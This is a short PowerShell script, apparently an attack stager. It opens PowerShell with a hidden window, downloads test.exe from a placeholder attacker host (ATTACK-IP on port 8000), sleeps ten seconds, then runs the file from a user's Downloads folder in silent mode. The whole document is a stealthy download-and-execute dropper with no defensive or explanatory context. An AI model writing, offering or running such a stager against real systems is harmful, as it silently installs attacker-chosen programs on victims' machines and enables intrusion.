powershell.exe -windowstyle hidden{

$server = "http://ATTACK-IP:8000/test.exe"
$out = "test.exe"

Invoke-Webrequest -Uri $server -Outfile $out
}

start-sleep -s 10

& "C:\Users\UserA\Downloads\Test.exe" /run /SilentMode
